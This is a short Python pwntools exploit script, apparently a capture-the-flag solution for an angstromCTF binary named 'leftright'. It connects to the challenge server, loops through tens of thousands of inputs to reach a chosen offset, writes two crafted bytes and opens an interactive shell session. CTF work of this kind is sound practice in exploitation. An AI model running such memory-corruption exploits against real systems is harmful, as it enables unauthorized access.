from pwn import *

# p = process("./leftright")
p = remote("challs.actf.co", 31324)

context.terminal=["konsole", "-e"]

p.sendlineafter(":", "A")
gdb.attach(p)

p.sendline("1")

for i in range(2**16 - 8 - 4 - 16 - 6 - 7*4 - 1):
    print(i)
    p.sendlineafter("x", "1")

p.sendlineafter("x", "2")
p.sendline("\x69")

p.sendlineafter("x", "1")

p.sendlineafter("x", "2")
p.sendline("\x70")

p.interactive()